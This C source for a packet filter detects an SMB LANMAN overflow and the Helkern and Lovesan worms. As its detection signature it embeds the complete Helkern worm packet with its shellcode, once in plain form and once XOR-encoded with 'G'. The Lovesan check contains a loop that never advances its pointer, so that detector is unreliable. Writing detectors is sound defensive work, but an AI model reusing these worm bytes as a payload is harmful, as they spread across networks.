PCHAR
pop_string (PUCHAR stack, PCHAR *string)
{
	*string =  stack;
	return stack + strlen (stack) + 1;
}

VERDICT
CheckSmbDie(PVOID	Packet)
{	
	PIP_HEADER	IpHeader = (PIP_HEADER) ((PCHAR)Packet + sizeof (ETH_HEADER));
	PTCP_HEADER	TcpHeader= (PTCP_HEADER) ((PCHAR)IpHeader +  IpHeader->Ihl * sizeof (ULONG) );
	PCHAR 		TcpData = (PCHAR)TcpHeader + sizeof(PVOID) * TcpHeader->DataOffset;

	PSMB_HEADER	SmbHeader = (PSMB_HEADER)(TcpData + sizeof (ULONG));
	if (SmbHeader->server_component[0] == 0xff	&&
		SmbHeader->server_component[1] == 'S'	&&
		SmbHeader->server_component[2] == 'M'	&&
		SmbHeader->server_component[3] == 'B'	)
	{		
		switch (SmbHeader->command)
		{
		case SMB_NEGOTIATE_PROTOCOL:
			break;
		case SMB_SESSION_SETUP_ANDX:
			break;
		case SMB_TREE_CONNECT_ANDX:
			break;
		case SMB_COM_TRANSACTION:
			{
				PTRANSACTION_REQUEST	Transaction = (PTRANSACTION_REQUEST)((PCHAR)SmbHeader + sizeof (SMB_HEADER));
				PSMB_PARAMETERS			params;
				PCHAR	p;
				PCHAR	String;					
				
				p = TcpData + 4 + sizeof (SMB_HEADER) + sizeof (TRANSACTION_REQUEST);
				
				p = pop_string(p, &String);
				params = (PSMB_PARAMETERS)p;
				
				if (strcmp("\\PIPE\\LANMAN", String) == 0	&&
					params->function_code == 0x68			&&
					params->recv_buffer_len > 1600/*MAX_PACKET_SIZE*/)					
				{					
					return Verdict_Discard;
				}
				
			}
			break;
		}
	}
	return Verdict_NotFiltered;
}
/*
char HelkernDump[376] = {
  0x04,0x01,0x01,0x01,0x01,0x01,0x01,0x01,
  0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,
  0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,
  0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,
  0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,
  0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,
  0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,
  0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,
  0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,
  0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,
  0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,
  0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,
  0x01,0xdc,0xc9,0xb0,0x42,0xeb,0x0e,0x01,
  0x01,0x01,0x01,0x01,0x01,0x01,0x70,0xae,
  0x42,0x01,0x70,0xae,0x42,0x90,0x90,0x90,
  0x90,0x90,0x90,0x90,0x90,0x68,0xdc,0xc9,
  0xb0,0x42,0xb8,0x01,0x01,0x01,0x01,0x31,
  0xc9,0xb1,0x18,0x50,0xe2,0xfd,0x35,0x01,
  0x01,0x01,0x05,0x50,0x89,0xe5,0x51,0x68,
  0x2e,0x64,0x6c,0x6c,0x68,0x65,0x6c,0x33,
  0x32,0x68,0x6b,0x65,0x72,0x6e,0x51,0x68,
  0x6f,0x75,0x6e,0x74,0x68,0x69,0x63,0x6b,
  0x43,0x68,0x47,0x65,0x74,0x54,0x66,0xb9,
  0x6c,0x6c,0x51,0x68,0x33,0x32,0x2e,0x64,
  0x68,0x77,0x73,0x32,0x5f,0x66,0xb9,0x65,
  0x74,0x51,0x68,0x73,0x6f,0x63,0x6b,0x66,
  0xb9,0x74,0x6f,0x51,0x68,0x73,0x65,0x6e,
  0x64,0xbe,0x18,0x10,0xae,0x42,0x8d,0x45,
  0xd4,0x50,0xff,0x16,0x50,0x8d,0x45,0xe0,
  0x50,0x8d,0x45,0xf0,0x50,0xff,0x16,0x50,
  0xbe,0x10,0x10,0xae,0x42,0x8b,0x1e,0x8b,
  0x03,0x3d,0x55,0x8b,0xec,0x51,0x74,0x05,
  0xbe,0x1c,0x10,0xae,0x42,0xff,0x16,0xff,
  0xd0,0x31,0xc9,0x51,0x51,0x50,0x81,0xf1,
  0x03,0x01,0x04,0x9b,0x81,0xf1,0x01,0x01,
  0x01,0x01,0x51,0x8d,0x45,0xcc,0x50,0x8b,
  0x45,0xc0,0x50,0xff,0x16,0x6a,0x11,0x6a,
  0x02,0x6a,0x02,0xff,0xd0,0x50,0x8d,0x45,
  0xc4,0x50,0x8b,0x45,0xc0,0x50,0xff,0x16,
  0x89,0xc6,0x09,0xdb,0x81,0xf3,0x3c,0x61,
  0xd9,0xff,0x8b,0x45,0xb4,0x8d,0x0c,0x40,
  0x8d,0x14,0x88,0xc1,0xe2,0x04,0x01,0xc2,
  0xc1,0xe2,0x08,0x29,0xc2,0x8d,0x04,0x90,
  0x01,0xd8,0x89,0x45,0xb4,0x6a,0x10,0x8d,
  0x45,0xb0,0x50,0x31,0xc9,0x51,0x66,0x81,
  0xf1,0x78,0x01,0x51,0x8d,0x45,0x03,0x50,
  0x8b,0x45,0xac,0x50,0xff,0xd6,0xeb,0xca
};
*/

#define HELKERN_DUMP_SIZE 376

// это дамп заксоренный с 'G'
unsigned char HelkernDump[HELKERN_DUMP_SIZE] = {
0x43,0x46,0x46,0x46,0x46,0x46,0x46,0x46,
0x46,0x46,0x46,0x46,0x46,0x46,0x46,0x46,
0x46,0x46,0x46,0x46,0x46,0x46,0x46,0x46,
0x46,0x46,0x46,0x46,0x46,0x46,0x46,0x46,
0x46,0x46,0x46,0x46,0x46,0x46,0x46,0x46,
0x46,0x46,0x46,0x46,0x46,0x46,0x46,0x46,
0x46,0x46,0x46,0x46,0x46,0x46,0x46,0x46,
0x46,0x46,0x46,0x46,0x46,0x46,0x46,0x46,
0x46,0x46,0x46,0x46,0x46,0x46,0x46,0x46,
0x46,0x46,0x46,0x46,0x46,0x46,0x46,0x46,
0x46,0x46,0x46,0x46,0x46,0x46,0x46,0x46,
0x46,0x46,0x46,0x46,0x46,0x46,0x46,0x46,
0x46,0x9b,0x8e,0xf7,0x5,0xac,0x49,0x46,
0x46,0x46,0x46,0x46,0x46,0x46,0x37,0xe9,
0x5,0x46,0x37,0xe9,0x5,0xd7,0xd7,0xd7,
0xd7,0xd7,0xd7,0xd7,0xd7,0x2f,0x9b,0x8e,
0xf7,0x5,0xff,0x46,0x46,0x46,0x46,0x76,
0x8e,0xf6,0x5f,0x17,0xa5,0xba,0x72,0x46,
0x46,0x46,0x42,0x17,0xce,0xa2,0x16,0x2f,
0x69,0x23,0x2b,0x2b,0x2f,0x22,0x2b,0x74,
0x75,0x2f,0x2c,0x22,0x35,0x29,0x16,0x2f,
0x28,0x32,0x29,0x33,0x2f,0x2e,0x24,0x2c,
0x4,0x2f,0x0,0x22,0x33,0x13,0x21,0xfe,
0x2b,0x2b,0x16,0x2f,0x74,0x75,0x69,0x23,
0x2f,0x30,0x34,0x75,0x18,0x21,0xfe,0x22,
0x33,0x16,0x2f,0x34,0x28,0x24,0x2c,0x21,
0xfe,0x33,0x28,0x16,0x2f,0x34,0x22,0x29,
0x23,0xf9,0x5f,0x57,0xe9,0x5,0xca,0x2,
0x93,0x17,0xb8,0x51,0x17,0xca,0x2,0xa7,
0x17,0xca,0x2,0xb7,0x17,0xb8,0x51,0x17,
0xf9,0x57,0x57,0xe9,0x5,0xcc,0x59,0xcc,
0x44,0x7a,0x12,0xcc,0xab,0x16,0x33,0x42,
0xf9,0x5b,0x57,0xe9,0x5,0xb8,0x51,0xb8,
0x97,0x76,0x8e,0x16,0x16,0x17,0xc6,0xb6,
0x44,0x46,0x43,0xdc,0xc6,0xb6,0x46,0x46,
0x46,0x46,0x16,0xca,0x2,0x8b,0x17,0xcc,
0x2,0x87,0x17,0xb8,0x51,0x2d,0x56,0x2d,
0x45,0x2d,0x45,0xb8,0x97,0x17,0xca,0x2,
0x83,0x17,0xcc,0x2,0x87,0x17,0xb8,0x51,
0xce,0x81,0x4e,0x9c,0xc6,0xb4,0x7b,0x26,
0x9e,0xb8,0xcc,0x2,0xf3,0xca,0x4b,0x7,
0xca,0x53,0xcf,0x86,0xa5,0x43,0x46,0x85,
0x86,0xa5,0x4f,0x6e,0x85,0xca,0x43,0xd7,
0x46,0x9f,0xce,0x2,0xf3,0x2d,0x57,0xca,
0x2,0xf7,0x17,0x76,0x8e,0x16,0x21,0xc6,
0xb6,0x3f,0x46,0x16,0xca,0x2,0x44,0x17,
0xcc,0x2,0xeb,0x17,0xb8,0x91,0xac,0x8d
};

VOID InitializeHelkern()
{
	ULONG i;
	for (i=0;i < HELKERN_DUMP_SIZE;i++)
	{
		HelkernDump[i] = HelkernDump[i] ^ 'G';
	}
}

VERDICT
CheckHelkernAttack(PVOID	Packet)
{
	PIP_HEADER	IpHeader  = (PIP_HEADER) ((PCHAR)Packet + sizeof (ETH_HEADER));
	PUDP_HEADER UdpHeader = (PUDP_HEADER) ((PCHAR)IpHeader +  IpHeader->Ihl * sizeof (ULONG));
	PCHAR 		UdpData = (PCHAR)UdpHeader + sizeof (UDP_HEADER);
	ULONG		UdpDataLength = htons(UdpHeader->Length) - sizeof (UDP_HEADER);

	if ( UdpDataLength >= HELKERN_DUMP_SIZE ) 
    if ( KlCompareMemory( UdpData, HelkernDump, HELKERN_DUMP_SIZE ) )
			 
	{
			 return Verdict_Discard;
	}		

	return Verdict_NotFiltered;
}

#define LOVESAN_DUMP_SIZE 4

char DComOverflow[4] = {
    0x5c, 0x00, 0x5c, 0x00
};

char ZeroTerminator[2] = {
    0x00, 0x00
};

unsigned char LoveSanSignature[LOVESAN_DUMP_SIZE] = {
    0x50, 0x6F, 0x7A, 0x85
};

ULONG   FindSubstr(PCHAR SrcBuffer, ULONG SrcBufferSize, PCHAR MyBuffer, ULONG MyBufferSize)
{   
    ULONG i, j;

    for (i=0; i <= SrcBufferSize - MyBufferSize; i++)
    {
        for (j = 0; j < MyBufferSize; ++j)
        {
            if ( SrcBuffer[ i + j ] != MyBuffer[ j ] )
            {
                i += j;
                break;
            }
        }
        if (j == MyBufferSize)
            return i;
    }
    return 0;
}


VERDICT
CheckLoveSanAttack(PVOID	Packet)
{
    PIP_HEADER	IpHeader  = (PIP_HEADER) ((PCHAR)Packet + sizeof (ETH_HEADER));
    PTCP_HEADER	TcpHeader= (PTCP_HEADER) ((PCHAR)IpHeader +  IpHeader->Ihl * sizeof (ULONG) );
	PCHAR 		TcpData = (PCHAR)TcpHeader + sizeof(PVOID) * TcpHeader->DataOffset;
    ULONG		TcpDataLength = htons(IpHeader->TotalLength) - sizeof(TCP_HEADER) - sizeof (IP_HEADER);
    ULONG       Offset = 0;

    UCHAR      * p;
    ULONG       length, i;
    USHORT     * p1;
    
    if ( TcpHeader->dstPort == htons ( 135 ) )
    if ( TcpDataLength >= 4 + 64 + 2)
    {
        p = TcpData;
        
        for  ( length = TcpDataLength - 3; length; --length, ++p )
        {
            if ( * ( unsigned long * ) p == 0x005c005c ) {
                p1 = ( unsigned short * )( p + 4 );
                
                for  ( i = 0; i < 32; ++i )
                {
                    if ( *p1 == 0 )
                    {
//                        printf ("all ok\n");
                        return Verdict_NotFiltered;
                    }
                }
//                printf("Attack\n");
                return Verdict_Discard;
                // detect
            }
        }
        
        if (length == 0)
        {            
//            printf ("all ok\n");
            return Verdict_NotFiltered;
        }
/*
        if ( Offset = FindSubstr(TcpData, TcpDataLength, DComOverflow, 4) )
        {
            if (0 == FindSubstr(TcpData + Offset, 32, ZeroTerminator, 2))
            {
                return Verdict_Discard;
            }
        }
*/
    }

	return Verdict_NotFiltered;

}